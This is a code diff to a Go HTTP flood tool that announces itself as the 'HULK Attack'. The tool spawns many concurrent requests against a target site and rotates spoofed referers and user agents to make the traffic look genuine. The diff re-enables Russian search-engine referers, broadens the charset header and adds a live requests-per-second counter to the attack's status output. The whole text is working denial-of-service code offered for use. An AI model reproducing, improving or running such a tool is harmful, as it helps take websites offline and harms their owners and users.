@@ -21,15 +21,15 @@ import (
 	"strings"
 	"sync/atomic"
 	"syscall"
+	"time"
 )
 
-const __version__  = "1.0.1"
+const __version__ = "1.0.1"
 
-// const acceptCharset = "windows-1251,utf-8;q=0.7,*;q=0.7" // use it for runet
-const acceptCharset = "ISO-8859-1,utf-8;q=0.7,*;q=0.7"
+const acceptCharset = "ISO-8859-1,utf-8,windows-1251;q=0.7,*;q=0.7"
 
 const (
-	callGotOk              uint8 = iota
+	callGotOk uint8 = iota
 	callExitOnErr
 	callExitOnTooManyFiles
 	targetComplete
@@ -37,15 +37,15 @@ const (
 
 // global params
 var (
-	safe            bool     = false
-	headersReferers []string = []string{
+	safe            = false
+	headersReferers = []string{
 		"http://www.google.com/?q=",
 		"http://www.usatoday.com/search/results?q=",
 		"http://engadget.search.aol.com/search?q=",
-		//"http://www.google.ru/?hl=ru&q=",
-		//"http://yandex.ru/yandsearch?text=",
+		"http://www.google.ru/?hl=ru&q=",
+		"http://yandex.ru/yandsearch?text=",
 	}
-	headersUseragents []string = []string{
+	headersUseragents = []string{
 		"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
 		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Vivaldi/1.3.501.6",
 		"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
@@ -60,7 +60,8 @@ var (
 		"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)",
 		"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
 	}
-	cur int32
+	cur       int32
+	startTime = time.Now().Unix()
 )
 
 type arrayFlags []string
@@ -127,16 +128,26 @@ func main() {
 		fmt.Println("-- HULK Attack Started --\n           Go!\n\n")
 		ss := make(chan uint8, 8)
 		var (
-			err, sent int32
+			err, sent int64
 		)
-		fmt.Println("In use               |\tResp OK |\tGot err")
+
+		fmt.Println("In use               |\tResp OK |\t   RPS |\tGot err |")
 		for {
 			if atomic.LoadInt32(&cur) < int32(maxproc-1) {
 				go httpcall(site, u.Host, data, headers, ss)
 			}
-			if sent%10 == 0 {
-				fmt.Printf("\r%6d of max %-6d |\t%7d |\t%6d", cur, maxproc, sent, err)
+
+			var (
+				diffTime         = time.Now().Unix() - startTime
+				currentRps int64 = 0
+			)
+
+			if diffTime > 0 {
+				currentRps = sent / diffTime
 			}
+
+			fmt.Printf("\r%6d of max %-6d |\t%7d |\t%6d |\t%7d |", cur, maxproc, sent, currentRps, err)
+
 			switch <-ss {
 			case callExitOnErr:
 				atomic.AddInt32(&cur, -1)
@@ -148,7 +159,7 @@ func main() {
 				sent++
 			case targetComplete:
 				sent++
-				fmt.Printf("\r%-6d of max %-6d |\t%7d |\t%6d", cur, maxproc, sent, err)
+				fmt.Printf("\r%-6d of max %-6d |\t%7d |\t%6s |\t%7d |", cur, maxproc, sent, "-", err)
 				fmt.Println("\r-- HULK Attack Finished --       \n\n\r")
 				os.Exit(0)
 			}
